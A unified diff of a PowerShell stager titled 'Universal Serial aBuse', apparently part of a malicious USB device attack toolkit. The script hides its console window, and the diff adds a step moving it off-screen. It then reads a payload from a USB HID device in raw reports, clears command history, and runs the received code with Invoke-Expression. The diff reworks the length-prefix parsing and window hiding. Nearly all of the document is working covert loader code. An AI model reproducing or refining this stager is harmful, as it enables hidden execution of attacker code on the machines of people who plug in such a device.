@@ -1,9 +1,9 @@
 $ui = $Host.UI.RawUI
 $ui.BackgroundColor = 'Black'
 $ui.ForegroundColor = 'White'
-$ui.WindowTitle = 'Universal Serial aBuse'
 Clear
 
+$ui.WindowTitle = 'Universal Serial aBuse'
 $M = 64
 $cs = '
 using System;
@@ -16,6 +16,8 @@ namespace n {
 		public static extern SafeFileHandle CreateFile(String fn, UInt32 da, Int32 sm, IntPtr sa, Int32 cd, uint fa, IntPtr tf);
 		[DllImport(%user32.dll%)]
 		public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
+		[DllImport(%user32.dll%)]
+		public static extern IntPtr SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int Y, int cx, int cy, int wFlags);
 
 		public static FileStream o(string fn) {
 			return new FileStream(CreateFile(fn, 0XC0000000U, 3, IntPtr.Zero, 3, 0x40000000, IntPtr.Zero), FileAccess.ReadWrite, 9, true);
@@ -24,8 +26,11 @@ namespace n {
 }
 '.Replace('%',[char]34)
 Add-Type -TypeDefinition $cs
+$h = (Get-Process -Id $pid).MainWindowHandle
+[n.w]::SetWindowPos($h, -2, 2000, 2000, 40, 40, 5)
+
 function stage() {
-	$null = [n.w]::ShowWindowAsync((Get-Process -Id $pid).MainWindowHandle, 6)
+	$null = [n.w]::ShowWindowAsync($h, 6)
 	$devs = gwmi Win32_USBControllerDevice
 	foreach ($dev in $devs) {
 		$wmidev = [wmi]$dev.Dependent
@@ -38,23 +43,21 @@ function stage() {
 		$g = $e = 0
 		$s = New-Object IO.MemoryStream
 		do {
-			$o = 0
 			$b = New-Object Byte[] ($M+1)
 			$f.Write($b, 0, $M+1)
 			$r = $f.Read($b, 0, $M+1)
 			if ($b[1] -gt 0) {
-				if ($e -eq 0) {
-					$e = ($b[2]*256)+$b[3]
-					$o = 2
-				}
-				$s.Write($b, $o+2, $b[1]-$o)
-				$g+=$b[1]-$o
-				# [System.Console]::Write($b, $o+2, $b[1]-$o)
+				$s.Write($b, 2, $b[1])
+				$g+=$b[1]
 				[System.Console]::WriteLine([String]::Format('{0} of {1}',$g, $e))
+				$a=$s.ToArray()
+				if ($e -eq 0 -and $g -gt 2) {
+					$e=($a[0]*256)+$a[1]
+				}
 			}
-		} while ($g -lt $e -or $e -eq 0)
+		} while ($g -lt $e+2 -or $e -eq 0)
 		clhy
-		IEx ([Text.Encoding]::ASCII).GetString($s.ToArray())
+		IEx ([Text.Encoding]::ASCII).GetString($a,2,$e)
 	} catch {
 		echo $_.Exception|format-list -force
 	}
